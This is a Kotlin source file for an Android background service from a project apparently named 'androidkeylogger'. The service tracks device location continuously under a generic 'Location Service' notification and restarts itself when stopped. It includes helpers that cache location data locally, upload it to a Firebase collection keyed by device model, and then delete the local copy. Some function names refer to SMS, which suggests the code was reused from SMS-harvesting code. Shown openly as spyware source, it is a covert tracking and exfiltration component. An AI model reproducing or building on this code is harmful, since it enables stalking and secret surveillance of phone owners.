package com.azamovhudstc.androidkeylogger.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.azamovhudstc.androidkeylogger.R
import com.azamovhudstc.androidkeylogger.activity.MainFixActivity
import com.azamovhudstc.androidkeylogger.listener.MyLocationListener
import com.azamovhudstc.androidkeylogger.model.LocationData
import com.azamovhudstc.androidkeylogger.model.SMSData
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader

class LocationService : Service() {

    private lateinit var locationManager: LocationManager
    private lateinit var notificationManager: NotificationManager
    private lateinit var locationListener: MyLocationListener
    private lateinit var firebaseFireStore : FirebaseFirestore

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()

        firebaseFireStore = FirebaseFirestore.getInstance()
        locationListener = MyLocationListener(this)
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Create notification channel if Android version is Oreo or above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Location Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }

        // Create notification
        val notificationIntent = Intent(this, MainFixActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0, notificationIntent, PendingIntent.FLAG_MUTABLE
        )

        val notification: Notification = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Location Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_signal)
            .setContentIntent(pendingIntent)
            .build()

        // Start service in foreground with notification
        startForeground(NOTIFICATION_ID, notification)

        locationListener.requestLocationUpdates(this)
        locationListener.setLocationDataListener {location->
            Log.d("EVENT", "onStartCommand: ${location}")

        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        // Stop location updates when service is destroyed
        locationManager.removeUpdates(locationListener)
    }

    private fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }


    private fun saveSmsDataToFirebase(smsData: LocationData, context: Context) {
        val deviceModel = android.os.Build.MODEL
        val collectionReference = FirebaseFirestore.getInstance().collection("location_$deviceModel")
        collectionReference.add(smsData)
            .addOnSuccessListener { documentReference ->
                Log.d("EVENT", "Location data sent to Firebase successfully")
            }
            .addOnFailureListener { e ->
                Log.e("EVENT", "Error sending Location data to Firebase", e)
            }
    }

    private fun isLocalSmsAvailable(context: Context): Boolean {
        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        return filePath.exists()
    }

    private fun saveSmsToFile(context: Context, smsData: LocationData) {
        val gson = Gson()

        // Convert the list to JSON string
        val jsonString = gson.toJson(smsData)

        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        val outputStream = FileOutputStream(filePath, false) // Rewrite the file
        outputStream.write(jsonString.toByteArray())
        outputStream.close()
    }

    private fun sendAllSmsDataToFirebase(context: Context) {
        val smsDataList = readSmsFromFile(context)
        val deviceModel = android.os.Build.MODEL
        val collectionReference = FirebaseFirestore.getInstance().collection("location_$deviceModel")
        for (smsData in smsDataList) {
            collectionReference.add(smsData)
                .addOnSuccessListener { documentReference ->
                    Log.d("EVENT", "Location data sent to Firebase successfully")
                    // Ma'lumot Firebase ga muvaffaqiyatli yuborilgan, shuning uchun lokal faylni o'chiramiz
                    deleteLocalSmsFile(context)
                }
                .addOnFailureListener { e ->
                    Log.e("EVENT", "Error sending Location data to Firebase", e)
                }
        }
    }

    private fun deleteLocalSmsFile(context: Context) {
        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        if (filePath.exists()) {
            filePath.delete()
            Log.d("EVENT", "Local Location file deleted successfully")
        } else {
            Log.e("EVENT", "Local Location file not found")
        }
    }

    private fun readSmsFromFile(context: Context): List<LocationData> {
        val gson = Gson()
        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)

        if (!filePath.exists()) {
            // If file doesn't exist, return an empty list
            return emptyList()
        }

        val fileReader = FileReader(filePath)
        val typeToken = object : TypeToken<List<LocationData>>() {}.type
        return gson.fromJson(fileReader, typeToken)
    }

    companion object {
        private const val CHANNEL_ID = "LocationServiceChannel"
        private const val NOTIFICATION_ID = 1
    }
}
